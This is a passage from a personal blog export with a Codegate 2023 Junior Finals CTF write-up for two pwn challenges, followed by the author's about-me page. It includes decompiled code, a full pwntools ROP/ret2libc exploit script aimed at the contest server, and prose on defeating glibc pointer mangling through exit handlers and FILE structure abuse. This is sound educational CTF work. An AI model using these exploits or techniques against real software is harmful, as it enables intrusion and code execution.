showed more vars here but I deleted them to make it cleaner here long local_988 [256]; char local_188 [264]; memset(local_188,0,0x100); memset(local_988,0,0x800); operatorTop = -1; operandTop = -1; i = 0; do { uVar6 = SEXT48(i); sVar4 = strlen(expression); if (sVar4 \u0026lt;= uVar6) { while (-1 \u0026lt; operatorTop) { lVar5 = (long)operatorTop; local_21 = local_188[lVar5]; iVar1 = operandTop + -1; local_30 = local_988[operandTop]; operandTop = operandTop + -2; local_38 = local_988[iVar1]; operatorTop = operatorTop + -1; local_40 = calculate(local_38,local_30,(int)local_188[lVar5],local_30); operandTop = operandTop + 1; local_988[operandTop] = local_40; } return local_988[operandTop]; } local_41 = expression[i]; ppuVar3 = __ctype_b_loc(); if (((*ppuVar3)[local_41] \u0026amp; 0x800) == 0) { if (local_41 == \u0026#39;(\u0026#39;) { operatorTop = operatorTop + 1; local_188[operatorTop] = \u0026#39;(\u0026#39;; } else { if (local_41 == \u0026#39;)\u0026#39;) { while ((-1 \u0026lt; operatorTop \u0026amp;\u0026amp; (local_188[operatorTop] != \u0026#39;(\u0026#39;))) { lVar5 = (long)operatorTop; local_61 = local_188[lVar5]; iVar1 = operandTop + -1; local_70 = local_988[operandTop]; operandTop = operandTop + -2; local_78 = local_988[iVar1]; operatorTop = operatorTop + -1; local_80 = calculate(local_78,local_70,(int)local_188[lVar5],local_70); operandTop = operandTop + 1; local_988[operandTop] = local_80; } if ((-1 \u0026lt; operatorTop) \u0026amp;\u0026amp; (local_188[operatorTop] == \u0026#39;(\u0026#39;)) { operatorTop = operatorTop + -1; } } else { if ((((local_41 == \u0026#39;+\u0026#39;) || (local_41 == \u0026#39;-\u0026#39;)) || (local_41 == \u0026#39;*\u0026#39;)) || ((local_41 == \u0026#39;/\u0026#39; || (local_41 == \u0026#39;^\u0026#39;)))) { while (-1 \u0026lt; operatorTop) { iVar1 = getPriority((int)local_188[operatorTop]); iVar2 = getPriority((int)local_41); if (iVar1 \u0026lt; iVar2) break; lVar5 = (long)operatorTop; local_42 = local_188[lVar5]; iVar1 = operandTop + -1; local_50 = local_988[operandTop]; operandTop = operandTop + -2; local_58 = local_988[iVar1]; operatorTop = operatorTop + -1; local_60 = calculate(local_58,local_50,(int)local_188[lVar5],local_50); operandTop = operandTop + 1; local_988[operandTop] = local_60; } operatorTop = operatorTop + 1; local_188[operatorTop] = local_41; } } } } else { local_20 = 0; while ((uVar6 = SEXT48(i), sVar4 = strlen(expression), uVar6 \u0026lt; sVar4 \u0026amp;\u0026amp; (ppuVar3 = __ctype_b_loc(), ((*ppuVar3)[(char)expression[i]] \u0026amp; 0x800) != 0))) { local_20 = (long)((char)expression[i] + -0x30) + local_20 * 10; i = i + 1; } operandTop = operandTop + 1; local_988[operandTop] = local_20; i = i + -1; } i = i + 1; } while( true ); } I actually didn\u0026rsquo;t fully reverse the evaluateExpression function as it was dense. I saw that it called __ctype_b_loc(), and assumed that it checked if the char in the expression was a digit or a symbol. I went to test this out by typing A-1 in the calculator, and a large number was outputted. I turned the number to hex and it was a PIE leak.\nGlad I didn\u0026rsquo;t have to reverse the evaluateExpression function :))\nI then tried to find a pop rdi; ret gadget in the binary to pop a GOT address into rdi and then just ret to puts@plt to leak libc, but no such gadget was found. I then breakpointed at the ret instruction inside note() to see what the registers are like when we control ret, and\n[ Legend: Modified register | Code | Heap | Stack | String ] ──────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x37 $rbx : 0x0 $rcx : 0x00007ffff7ea7a37 → 0x5177fffff0003d48 (\u0026#34;H=\u0026#34;?) $rdx : 0x0 $rsp : 0x00007fffffffe2d8 → \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]\u0026#34; $rbp : 0x4141414141414141 (\u0026#34;AAAAAAAA\u0026#34;?) $rsi : 0x00007fffffffc180 → \u0026#34;Notepad: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]\u0026#34; $rdi : 0x00007fffffffc060 → 0x00007ffff7df50d0 → \u0026lt;funlockfile+0\u0026gt; endbr64 $rip : 0x0000555555555ac9 → \u0026lt;note+174\u0026gt; ret $r8 : 0x37 $r9 : 0x7fffffff $r10 : 0x0 $r11 : 0x246 $r12 : 0x00007fffffffe408 → 0x00007fffffffe66e → \u0026#34;/home/vagrant/ctf/finals_codegate23/calculator/cal[...]\u0026#34; $r13 : 0x0000555555555b58 → \u0026lt;main+0\u0026gt; endbr64 $r14 : 0x0000555555557d78 → 0x0000555555555220 → \u0026lt;__do_global_dtors_aux+0\u0026gt; endbr64 $r15 : 0x00007ffff7ffd040 → 0x00007ffff7ffe2e0 → 0x0000555555554000 → jg 0x555555554047 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 rdi is already pointing to a libc address.\nSo I just ret to puts@plt to leak libc, and then ret back to _start (entry point) to restart the program, and then just ret2libc.\nexploit.py from pwn import * #io = process(\u0026#34;./calc\u0026#34;) io = remote(\u0026#34;13.125.200.127\u0026#34;,8888) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) io.sendlineafter(\u0026#34;command\u0026gt;\u0026#34;,\u0026#34;calc\u0026#34;) io.sendlineafter(\u0026#34;Formula\u0026gt;\u0026#34;,\u0026#34;A\u0026#34;) io.recvuntil(\u0026#34;Result\u0026gt; \u0026#34;) pieBase = int(io.recvline()[:-1]) - 5951 log.info(\u0026#34;PIE BASE: \u0026#34; + hex(pieBase)) putsPlt = p64(pieBase + 0x10e0) entry = p64(pieBase + 0x1180) rop = b\u0026#34;A\u0026#34; * 56 + putsPlt + entry io.sendlineafter(\u0026#34;command\u0026gt;\u0026#34;,\u0026#34;note\u0026#34;) io.sendlineafter(\u0026#34;Note\u0026gt;\u0026#34;,rop) io.recvline() libc.address = u64(io.recv(6).ljust(8,b\u0026#34;\\x00\u0026#34;)) - libc.symbols[\u0026#34;funlockfile\u0026#34;] log.info(\u0026#34;LIBC BASE: \u0026#34; + hex(libc.address)) popRdi = p64(libc.address + 0x2a3e5) ret = p64(pieBase + 0x1be9) rop2 = b\u0026#34;A\u0026#34;*56 + ret + popRdi + p64(next(libc.search(b\u0026#34;/bin/sh\u0026#34;))) + p64(libc.symbols[\u0026#34;system\u0026#34;]) io.sendlineafter(\u0026#34;command\u0026gt;\u0026#34;,\u0026#34;note\u0026#34;) io.sendlineafter(\u0026#34;Note\u0026gt;\u0026#34;,rop2) io.interactive() I actually managed to get first blood for this chall, and for the whole pwn category, which is my first ever first blood 🩸!\ngoblin_vm (pwn) checksec:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled src.c undefined8 main(void){ bool bVar1; undefined isLargeRoom; char *untilSpaceStr; long in_FS_OFFSET; undefined4 local_828; int instr; undefined4 *mallocChunk; char code [2056]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); setup(); isLargeRoom = askRoom(); room = giveRoom(isLargeRoom); bVar1 = false; local_828 = 1; mallocChunk = (undefined4 *)malloc(4); *mallocChunk = 1; do { memset(code,0,0x800); getInput(code); untilSpaceStr = strtok(code,\u0026#34; \u0026#34;); instr = atoi(untilSpaceStr); switch(instr) { case 1: instr1(); break; case 2: instr2(); break; case 3: instr3(); break; case 4: instr4(); break; case 5: instr5(); break; case 6: instr6(); break; case 7: instr7(); break; case 8: instr8(); break; case 9: instr9(); break; case 10: instr10(mallocChunk,\u0026amp;local_828,\u0026amp;local_828); break; case 0xb: bVar1 = true; } } while (!bVar1); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return 0; } undefined8 askRoom(void){ ssize_t sVar1; undefined8 uVar2; long in_FS_OFFSET; char local_118 [264]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(\u0026#34;Hi, Do you want a large room? [y/N]\u0026#34;); sVar1 = read(0,local_118,10); if (sVar1 == -1) { exit(-1); } if ((local_118[0] == \u0026#39;y\u0026#39;) || (local_118[0] == \u0026#39;Y\u0026#39;)) { uVar2 = 1; } else { uVar2 = 0; } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return uVar2; } long giveRoom(char param_1){ void *pvVar1; size_t local_18; if (param_1 == \u0026#39;\\0\u0026#39;) { local_18 = 0x100000; } else { local_18 = 0x400000; } pvVar1 = calloc(local_18,1); return (long)pvVar1 + (local_18 \u0026gt;\u0026gt; 1); } The binary is an implementation of the classic stack machine.\nIt first asks if you would want a large room (room here is refering to the vm\u0026rsquo;s stack/memory), and will calloc(0x400000) if you answer \u0026lsquo;Y\u0026rsquo;, and calloc(0x100000) if you answer anything else. Since the malloc request sizes are so large, the chunk is actually not allocated at the heap, but instead fulfilled using mmap(), having the memory map being allocated right above libc. This means that the room/vm\u0026rsquo;s stack is right above libc.\nIt then asks for instructions in a while loop, expecting input in the form of: opcode arg.\nSo for example: 1 9\nLet\u0026rsquo;s look at what the instructions actually do:\nvoid instr1(void){ // push reg onto stack room = (room - 8); *room = reg; return; } void instr2(void){ // pop value on top of stack into reg reg = *room; // qword room = room + 1; // ptr addition, so actually + 8 return; } void instr3(void){ // reg++ reg = reg + 1; // actually add 1 return; } void instr4(void){ // reg-- reg = reg - 1; return; } void instr5(void){ // 5 123 // reg += 123 __nptr = strtok(0x0,\u0026#34; \u0026#34;); lVar1 = atoll(__nptr); reg = reg + lVar1; return; } void instr6(void){ // 6 123 // reg -= 123 __nptr = strtok((char *)0x0,\u0026#34; \u0026#34;); lVar1 = atoll(__nptr); reg = reg - lVar1; return; } void instr7(void){ // 7 123 // reg = 123 char *__nptr; __nptr = strtok((char *)0x0,\u0026#34; \u0026#34;); reg = atoll(__nptr); return; } void instr8(void){ // 8 123 // room += 123 __nptr = strtok((char *)0x0,\u0026#34; \u0026#34;); lVar1 = atoll(__nptr); room = lVar1 + room; return; } void instr9(void){ // 9 123 // room -= 123 __nptr = strtok((char *)0x0,\u0026#34; \u0026#34;); lVar1 = atoll(__nptr); room = room - lVar1; return; } void instr10(int *param_1,int *param_2){ // a leak // a global variable, a stack variable, and a heap variable is set to 1 if (((DAT_00104010 == 1) \u0026amp;\u0026amp; (*param_1 == 1)) \u0026amp;\u0026amp; (*param_2 == 1)) { printf(\u0026#34;rax: %ld\\n\u0026#34;,reg); DAT_00104010 = 0; *param_1 = 0; *param_2 = 0; } return; } So room is essentially $rsp, and reg is essentially $rax.\nThere are simple push and pop instructions, and instructions to manipulate both the registers. There\u0026rsquo;s also an instruction to print out the value of reg, but it can only be called once. There\u0026rsquo;s 3 booleans, 1 in the .data segment, 1 in the stack, and 1 in the heap, that all become true when the print instruction is called.\nThe obvious vulnerability here is that there are completely no bounds check on where you can move room. And since room is right above libc, you can easily move room into libc and leak an address, and overwrite libc structures stored in libc memory. You wouldn\u0026rsquo;t need any leaks to do that since room is relative to libc_base, and other libc addresses, meaning that everytime the binary is ran, the offset between room and let\u0026rsquo;s say main_arena is the same. (Assuming you choose the same room size,big/small, everytime.)\nExploitation ideas You could of course try to overwrite the ret pointer of main and just try to ret2libc, but for that to work you have to move room-\u0026gt;stack, and in order to do that you have to know\nwhere room is where the stack is However, you only have one leak.\nTechnically, you could try to overwrite the global boolean, the stack boolean, and maybe overwrite the heap chunk pointer on the stack so that it points to other memory in order to execute instruction 10 more. But the problem is for that to work you have to leak libc,pie,and stack, which is ultimately what we can\u0026rsquo;t do, and is trying to do.\nSo you essentially can\u0026rsquo;t move to other sections of memory (like stack, heap, .data etc) since you would need 2 leaks to do that, and can only move around libc memory.\nAt first I tried the naive idea of overwriting the vtable pointer of the stdout FILE structure in libc (_IO_2_1_stdout_), by leaking a libc address, calculating the address of system, and making my own vtable at the default location of room (where room was initially at in the beginning). But this exploit didn\u0026rsquo;t work, and instead printed out\nFatal error: glibc detected an invalid stdio handle\nas there was a mitigation applied after glibc 2.24, that checks the address of vtable before any virtual functions are called.\nI tried googling around and looking for ways to bypass this, and found some writeups, one of which being this. But all the writeups seemed quite old, I quickly scrolled through them and I didn\u0026rsquo;t really have much faith on them working on glibc 2.35.\nSo I went back to square one and kept thinking of other exploitation ideas.\nAbusing exit handlers I actually first thought about abusing exit handlers after I finished analysing the binary since I explored the technique quite recently. But I thought that that idea wasn\u0026rsquo;t possible since exit() wasn\u0026rsquo;t called, and I quickly dismissed the idea.\nAfter failing to do the vtable overwrite however, I revisited this idea, and wondered whether exit was still called by libc after main returned, and guess what, exit was indeed called.\nIf you\u0026rsquo;re not familliar with this technique, I recommend reading this article\nEssentially exit() is just a wrapper function for:\n__run_exit_handlers (status, \u0026amp;__exit_funcs, true, true);\nAnd in libc memory, there is a variable called __exit_funcs, which is an exit_function_list structure. __exit_funcs points to the head of a linked list, that contains multiple exit_function objects. (One linked list element has multiple exit_function objects, when more exit_function objects are required, another linked list element will be created).\nWhen __run_exit_handlers(\u0026hellip;) is called, all the function pointers in the exit_function objects will be called. There are multiple flavors/types of exit_function objects that are all treated slightly differently by __run_exit_handlers(\u0026hellip;), (I recommend reading the article to learn more), but the flavor we\u0026rsquo;re gonna look into is the cxa flavor.\nThis is because by default, there will be already an exit_function object registered in the list, which contains the function pointer of _dl_fini(), and that exit_function object is of the flavor cxa.\nIn the libc source code, the definition of the cxa exit_function struct is\nstruct exit_function { long int flavor; ... // I redacted a lot of parts for simplicity, read the article for clearer full view struct { void (*fn) (void *arg, int status); void *arg; void *dso_handle; } cxa; ... }; In memory, everything looks something like:\n0x7ffff7fac838 \u0026lt;__exit_funcs\u0026gt;: 0x00007ffff7fadf00 ... 0x00007ffff7fadf00 │+0x0000: 0x0000000000000000 0x00007ffff7fadf08 │+0x0008: 0x0000000000000001 0x00007ffff7fadf10 │+0x0010: 0x0000000000000004 - 0x00007ffff7fadf18 │+0x0018: 0x93b315d57adee436 |--- one exit_function object 0x00007ffff7fadf20 │+0x0020: 0x0000000000000000 | 0x00007ffff7fadf28 │+0x0028: 0x0000000000000000 - 0x00007ffff7fadf30 │+0x0030: 0x0000000000000000 As you can see, the _dl_fini function pointer is mangled, this is a mitigation by libc to prevent exit handlers being so easily abused.\nThe mangling is essentially done with:\n// let rdx = function xor rdx,QWORD PTR fs:0x30 rol rdx,0x11 What\u0026rsquo;s inside fs:0x30 is called the pointer_guard, which is just 16 random bytes.\nWhen I was reading the article, I questioned what was the fs register used for, and what it was pointing at. A quick google search showed me this, which said that the fs register is used to point at the TLS (Thread Local Storage), which I assume is to store thread information.\nBack to the challange What I could do is just overwrite the _dl_fini exit_function object, with the mangled address of system, and an address to /bin/sh underneath it. But the question is, how can I mangle the address of system?\nHow the article defeated pointer mangling was by leaking the mangled _dl_fini address, and doing\nptr_guard = ror(ptr_encoded, 0x11, 64) ^ _dl_fini # this works because # _dl_fini = ror(mangled_ptr) ^ ptr_guard # ptr_guard = _dl_fini ^ ror(mangled_ptr) However for this to work, you would need two leaks, one to leak libc, one to leak the mangled_ptr. Thankfully when I was reading through @nobodyisnobody\u0026rsquo;s writeup collection, I came across this writeup, which defeated the pointer_guard by overwriting it in the TLS.\nshoutout to @nobodyisnobody btw, I\u0026rsquo;ve learned quite a bit of stuff from his writeups\nHowever when I first read this writeup before the ctf, I tried to explore this idea by finding where the TLS is in gdb to look at the object, but everytime I tried to view the fs register\ngef➤ print $fs $1 = 0x0 I revisited this idea during the ctf, and thankfully I came across this writeup, which printed out the fs register in gdb using\ngef➤ print $fs_base $1 = 0x7ffff7d90740 The TLS is in libc memory! So now I can calculate the constant offset from libc base to TLS, and overwrite the pointer_guard to 0. Then I overwrote the mangled _dl_fini address into rol(system,0x11,64), and then wrote the default address of room right underneath it, and put the \u0026ldquo;/bin/sh\u0026rdquo; string at the default location of room.\nExploit worked, and shell popped. Gg.\nMinor inconveniences atoll() is used in the vm\u0026rsquo;s instructions when loading numbers into the reg, so the maximum number you could load was 0x7fffffffffffffff since a signed long is read. This was a problem when I was writing the rol(system), as the addresses were generally \u0026gt; 0x7fffffffffffffff. I got around this by using two writes to write the rol(system) addres. After the ctf, I talked to @samuzora, and he had the idea to just use negative numbers to do the write, which is a much cleaner approach compared to mine.\nMy exploit worked locally, but kept failing remotely. I kept getting:\ntimeout: the monitored command dumped core /home/ctf/run.sh: line 2: 573 Illegal instruction timeout 60 /home/ctf/goblin_vm I contacted the organizers and they said that the chall had no problems.\nI investigated it using a docker container, and it seems like my libc leaks were inconsistent. Iirc, I was leaking libc addresses from the region at around libc_base+0x219000. I changed my exploit to leak from the default vtable of libc. So note to self, don\u0026rsquo;t leak random libc addresses found in libc next time, leak libc function symbols instead.\nAnother approach I also talked to @pepsipu after the ctf, and he actually solved this chall by overwriting the stdout FILE structure. What he did was enable full buffering on by overwriting the FILE object flags with Or(default flags,0x1800), which tells the stdout object to dump its buffer before printing. He then pops the IO_write_end pointer to reg, add it with 0x7000, then overwrote the IO_write_end pointer with the new value. This will make the IO object to believe the end of the buffer is much further than it actually is.\nWhen printf is called, the IO object will flush the buffer and print out everything between IO_write_base and IO_write_end, and thus leaking everything you\u0026rsquo;ll ever need.\nHe then just does a simple ret2libc to get shell.\nCool technique.\nConclusion This was my first ever irl ctf event, and I enjoyed it very much. I met tons of cool skilled people, and got a few cool stickers too. I strongly believe that this is the first to many irl ctfs, and I\u0026rsquo;ll work hard to get stronger and more skillful to make this true.\nThanks to the organizers for holding such a great event, and I hope I can go to more onsite finals soon and meet more cool people soon.\nepicHaxorl337swag!1! ","permalink":"https://zeynarz.github.io/posts/codegate_finals23/","summary":"my experience at codegate 2023 finals, and writeups for junior challs","title":"Codegate Finals 2023 (Juniors)"},{"content":"I play a character called zeynarz on the internet, a pwn player from the international ctf team thehackerscrew. Sometimes, I play ctfs solo as well. I mainly play pwn, but I\u0026rsquo;m currently learning crypto too.\nI\u0026rsquo;m very interested in how computers work under the hood, and likes to do computer programming and hacking (specifically pwn/binary exploitation) for fun. I enjoy creative problem solving a lot, and like to practice on websites like pwnable.tw and cryptohack. I also like to work on low level things (as well as of course, breaking them). I have a keen interest in electronics and robotics as well, and how these fields can be used to reshape our world.\nI started learning pwn in late 2020 by watching LiveOverflow\u0026rsquo;s binary exploitation playlist, and learned how computers actually worked by following a great course called nand2tetris in 2021. Massive thanks to LiveOverflow and the nand2tetris team for helping me lay the foundation of my pwn and computer science knowledge, as well as sparking my curiousity in hacking and how computers work.\nAchievements a list of some of the things that I\u0026rsquo;ve done\nin teams achievements that I\u0026rsquo;ve gotten with a team in ctfs where I played and contributed\n[thehackerscrew] 5th in Imaginary CTF 2023 [thehackerscrew] 10th in SEETF 2023 [thehackerscrew] 11th in ISITDTU CTF Finals @ Da Nang, Vietnam 2023 [thehackerscrew] 13th in GrayCTF Quals 2023 [thehackerscrew] 13th in HITCON CTF Quals 2023 [ScrewTolerance] 11th in WACON CTF Prequal 2023 solo 8th in Codegate Junior Finals @ Seoul, Korea 2023 10th in Wargames.MY CTF (professional category) 2023 Global Cybersecurity Camp 2024 (GCC) candidate 2024 top 150 on pwnable.tw as of Feb 2024 ","permalink":"https://zeynarz.github.io/aboutme/","summary":"aboutme","title":"刘智仁 (zhiren)"}]